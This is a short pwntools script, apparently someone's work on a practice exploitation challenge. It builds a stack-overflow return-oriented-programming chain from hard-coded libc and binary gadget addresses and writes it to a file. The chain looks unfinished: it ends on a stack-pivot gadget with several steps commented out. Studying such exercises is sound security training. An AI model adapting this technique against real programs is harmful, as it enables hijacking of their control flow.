#!/bin/python3

from pwn import *

offset = 40;
libCBase = 0x7ffff7dcb000
base = 0x00400000


usefulFunction = p64(base + 0x0742) 
popRdi = p64(libCBase + 0x23875)
popRdxRbx = p64(libCBase + 0x826d9)
ret = p64(libCBase + 0x023206)
mov = p64(libCBase + 0xa2e50)
poprsp = p64(libCBase + 0x234ea)

rop = b"A"*offset
rop += ret
rop += popRdi
rop += p64(0x00601060)
rop += p64(base+0x560)
rop += poprsp
#rop += p64(base + 0x84A)
#rop += popRdxRbx
#rop += p64(0xAAAAAAAA)
#rop += p64(0xAAAAAAAA)
#rop += mov
with open('address', 'wb') as f:
	f.write(rop)
